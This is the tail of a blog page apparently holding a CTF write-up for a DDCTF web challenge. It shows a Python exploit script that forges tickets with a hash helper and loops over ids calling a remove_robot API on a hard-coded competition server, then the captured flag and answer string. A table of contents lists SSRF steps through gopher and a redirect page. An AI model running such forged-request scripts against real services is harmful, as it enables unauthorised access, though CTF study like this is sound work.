<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">m = get_hash(&apos;35c26fc4f394c54e934379cb8d80ed85&apos;,&apos;id62&apos;,&apos;id62&apos;,31)</span><br><span class="line">msg = m[2].rstrip(&apos;id62&apos;)</span><br><span class="line">tic = m[0]</span><br><span class="line">r = s.get(&quot;http://117.51.147.155:5050/ctf/api/remove_robot?&#123;&#125;=&amp;id=62&amp;ticket=&#123;&#125;&quot;.format(msg,tic))</span><br><span class="line">print r.text</span><br><span class="line">for i in range(0,151):</span><br><span class="line">    print i</span><br><span class="line">    m = get_hash(&apos;35c26fc4f394c54e934379cb8d80ed85&apos;,&apos;id62&apos;,&apos;id&#123;&#125;&apos;.format(i),31)</span><br><span class="line">    tic = m[0]</span><br><span class="line">    msg = &apos;&apos;.join(m[2].rsplit(&apos;id&#123;&#125;&apos;.format(i), 1))</span><br><span class="line">    print msg</span><br><span class="line">    print &quot;http://117.51.147.155:5050/ctf/api/remove_robot?&#123;&#125;=&amp;id=&#123;&#125;&amp;ticket=&#123;&#125;&quot;.format(msg,i,tic)</span><br><span class="line">    r = s.get(&quot;http://117.51.147.155:5050/ctf/api/remove_robot?&#123;&#125;=&amp;id=&#123;&#125;&amp;ticket=&#123;&#125;&quot;.format(msg,i,tic))</span><br><span class="line">    time.sleep(1)</span><br><span class="line">    print r.text</span><br><span class="line">    print json.loads(r.text)[&apos;msg&apos;]</span><br><span class="line">r = self.s.get(&apos;http://117.51.147.155:5050/ctf/api/get_flag&apos;)</span><br><span class="line">print r.text</span><br></pre></td></tr></table></figure>

<p>r.text</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag &#123;&quot;code&quot;:200,&quot;data&quot;:[&quot;DDCTF&#123;chiken_dinner_hyMCX[n47Fx)&#125;&quot;],&quot;msg&quot;:&quot;\u5927\u5409\u5927\u5229\uff0c\u4eca\u665a\u5403\u9e21&quot;&#125;</span><br></pre></td></tr></table></figure>


<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DDCTF&#123;chiken_dinner_hyMCX[n47Fx)&#125;</span><br></pre></td></tr></table></figure>


  </article>
  <aside class="table-content" id="site-toc">
  <div class="table-content-title">
    <i class="fa fa-arrow-right fa-lg" id="site-toc-hide-btn"></i>
    <span>目录</span>
  </div>
  <div class="table-content-main">
    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#读取源码"><span class="toc-text">读取源码</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#构造数据包"><span class="toc-text">构造数据包</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#构造出gopher"><span class="toc-text">构造出gopher</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#构造重定向页面"><span class="toc-text">构造重定向页面</span></a></li></ol>
  </div>
</aside>
  
  
    <div class="passage-tags">
     
      <a href="/tags/WEB/"><i class="fa fa-tags"></i>WEB</a>
     
      <a href="/tags/CTF/"><i class="fa fa-tags"></i>CTF</a>
    
    </div>
  
</div>

    </main>
    
      
<div class="site-comment-contanier" data-plateform="leancloud">
  
    <p id="site-comment-info">
      <i class="fa fa-spinner fa-spin"></i> 评论加载中
    </p>
    <div id="site-comment"></div>
  
</div>
    
    <div class="site-footer-wrapper">
  <footer class="site-footer">
    
      
        <div class="site-footer-col">
          <h5 class="site-footer-title"></h5>
          
            <span class="site-footer-item">
              <a href="https://godbmw.com/" target="_blank"></a>
            </span>
          
            <span class="site-footer-item">
              <a href="http://ruanyifeng.com/" target="_blank"></a>
            </span>
          
        </div>
      
        <div class="site-footer-col">
          <h5 class="site-footer-title"></h5>
          
            <span class="site-footer-item">
              <a href="https://godbmw.com/categories/webpack4%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B/" target="_blank"></a>
            </span>
          
            <span class="site-footer-item">
              <a href="https://godbmw.com/design-patterns/" target="_blank"></a>
            </span>
          
        </div>
      
        <div class="site-footer-col">
          <h5 class="site-footer-title"></h5>
          
            <span class="site-footer-item">
              <a href="https://juejin.im/user/5b91fcf06fb9a05d3c7fd4a5" target="_blank"></a>
            </span>
          
            <span class="site-footer-item">
              <a href="https://segmentfault.com/" target="_blank"></a>
            </span>
          
        </div>
      
    
    <div class="site-footer-info">
      <i class="fa fa-clock-o"></i> 本站已稳定运行<span id="site-time"></span>
    </div>
    
      <div class="site-footer-info">
        <i class="fa fa-paw"></i> 您是本站第 <span id="site-count"></span> 位访客
      </div>
    
    
      <div class="site-footer-info">
        <i class="fa fa-at"></i> Email: 954093370@qq.com
      </div>
    
    <div class="site-footer-info">
      <i class="fa fa-copyright"></i> 
      2019 <a href="https://github.com/dongyuanxin/theme-ad/" target="_blank">Theme-AD</a>.
      Created by <a href="https://godbmw.com/" target="_blank">GodBMW</a>.
      All rights reserved.
    </div>
  </footer>
</div>
    <div id="site-layer" style="display:none;">
  <div class="site-layer-content">
    <div class="site-layer-header">
      <span class="site-layer-header-title" id="site-layer-title"></span>
      <i class="fa fa-close" id="site-layer-close"></i>
    </div>
    <div class="site-layer-body" id="site-layer-container">
      <div class="site-layer-input" id="site-layer-search" style="display: none;">
        <div class="site-layer-input-choose">
          <a href="javascript:void(0);" title="Change Search Engine">Google</a>
        </div>
        <input type="text">
        <i class="fa fa-search"></i>
      </div>
      
        <div class="site-layer-reward" id="site-layer-reward" style="display: none;">
          
            <div>
              <img src="/images/wechat.png" alt="WeChat">
              
                <p>WeChat</p>
              
            </div>
          
            <div>
              <img src="/images/alipay.png" alt="AliPay">
              
                <p>AliPay</p>
              
            </div>
          
        </div>
      
      <div id="site-layer-welcome" style="display:none;"></div>
    </div>
  </div>
</div>
    

<div class="bottom-bar">
  <div class="bottom-bar-left">
    <a href="/2019/08/08/2019-8-8-CTF/" data-enable="true">
      <i class="fa fa-arrow-left"></i>
    </a>
    <a href="/2019/04/29/2019-4-29-CTF/" data-enable="true">
      <i class="fa fa-arrow-right"></i>
    </a>
  </div>
  <div class="bottom-bar-right">
    <a href="javascript:void(0);" data-enable="true" id="site-toc-show-btn">
      <i class="fa fa-bars"></i>
    </a>
    
      <a href="#site-comment" data-enable="true">
        <i class="fa fa-commenting"></i>
      </a>
    
    <a href="javascript:void(0);" id="site-toggle-share-btn">
      <i class="fa fa-share-alt"></i>
    </a>
    
      <a href="javascript:void(0);" id="site-reward">
        <i class="fa fa-thumbs-up"></i>
      </a>
    
    <a href="javascript:void(0);" id="back-top-btn">
      <i class="fa fa-chevron-up"></i>
    </a>
  </div>
</div>
    <div id="share-btn">
  
  
  
  
  
</div>
    





    
  </body>
</html>